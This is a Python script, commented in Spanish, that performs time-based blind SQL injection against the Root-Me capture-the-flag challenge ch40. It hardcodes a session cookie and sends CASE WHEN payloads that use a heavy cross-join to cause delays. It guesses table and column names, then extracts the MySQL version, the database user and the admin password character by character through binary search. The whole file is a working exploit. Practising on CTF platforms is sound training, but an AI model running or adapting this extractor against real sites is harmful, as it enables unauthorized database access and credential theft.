#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 5 - CORREGIDO CON CASE
"""
import requests
import time
import statistics
import json
from datetime import datetime

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        self.results = {}
        self.log_entries = []
        
    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        entry = f"[{timestamp}] [{level}] {msg}"
        print(entry)
        self.log_entries.append(entry)
    
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        # Usamos CASE en lugar de IF
        payload = f"1 AND CASE WHEN {condition} THEN {self.heavy} ELSE 0 END"
        t = self.test_payload(payload, repeats=repeats)
        result = t > self.threshold
        return result
    
    def get_length(self, query):
        self.log(f"Obteniendo longitud: {query[:40]}...", "DEBUG")
        
        # Búsqueda binaria para longitud
        low, high = 1, 100
        
        while low <= high:
            mid = (low + high) // 2
            cond = f"LENGTH(({query})) >= {mid}"
            
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        
        return low - 1
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo"):
        self.log(f"{label}...")
        
        length = self.get_length(query)
        if length == 0:
            self.log("  No se pudo obtener la longitud", "ERROR")
            return None
        
        self.log(f"  Longitud: {length}")
        
        result = ""
        for pos in range(1, length + 1):
            char = self.extract_char(query, pos)
            result += char
            self.log(f"  [{pos}/{length}] '{char}' (ASCII: {ord(char)})")
        
        return result
    
    def verify_table(self, table):
        """Verifica si una tabla existe"""
        return self.is_true(f"EXISTS(SELECT * FROM {table})")
    
    def verify_column(self, table, column):
        """Verifica si una columna existe en una tabla"""
        return self.is_true(f"EXISTS(SELECT {column} FROM {table})")
    
    def test_conditions(self):
        """Prueba condiciones básicas para verificar el funcionamiento"""
        self.log("Verificando condiciones básicas...")
        
        tests = [
            ("1=1", "TRUE simple"),
            ("1=2", "FALSE simple"),
            ("'1'='1'", "TRUE con comillas"),
            ("'1'='2'", "FALSE con comillas"),
            ("LENGTH('abc')=3", "LENGTH TRUE"),
            ("LENGTH('abc')=1", "LENGTH FALSE"),
        ]
        
        for cond, desc in tests:
            result = self.is_true(cond, repeats=2)
            self.log(f"  {desc}: {result} -> {cond}")
            time.sleep(0.05)

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("=" * 70)
print("  SQL INJECTION TIME-BASED - ROOT-ME CH40")
print("=" * 70)

# 1. Verificar condiciones
injector.test_conditions()

# 2. Verificar tablas
print("\n[*] Verificando tablas:")
tablas = ['usuarios', 'users', 'member', 'members', 'admin', 'administradores']
for tabla in tablas:
    existe = injector.verify_table(tabla)
    print(f"    {tabla}: {existe}")

# 3. Encontrar columnas en usuarios
print("\n[*] Buscando columnas en 'usuarios':")
columnas = ['username', 'user', 'login', 'name', 'admin', 'usuario', 'email']
col_user = None

for col in columnas:
    if injector.verify_column('usuarios', col):
        print(f"    [+] Columna usuario: {col}")
        col_user = col
        break

columnas_pass = ['password', 'pass', 'clave', 'contrasena', 'pwd', 'pw']
col_pass = None

for col in columnas_pass:
    if injector.verify_column('usuarios', col):
        print(f"    [+] Columna contraseña: {col}")
        col_pass = col
        break

if col_user and col_pass:
    # 4. Extraer información
    print("\n[*] Extrayendo información...")
    
    injector.results["version"] = injector.extract_string("SELECT VERSION()", "Versión de MySQL")
    injector.results["database"] = injector.extract_string("SELECT DATABASE()", "Base de datos")
    injector.results["user"] = injector.extract_string("SELECT USER()", "Usuario")
    
    # 5. Extraer contraseña del admin
    query = f"SELECT {col_pass} FROM usuarios WHERE {col_user}='admin'"
    injector.results["password"] = injector.extract_string(query, "Contraseña del admin")
    
    # 6. Mostrar resultados
    print("\n" + "=" * 70)
    print("  RESULTADOS FINALES")
    print("=" * 70)
    for key, value in injector.results.items():
        print(f"  {key}: {value}")
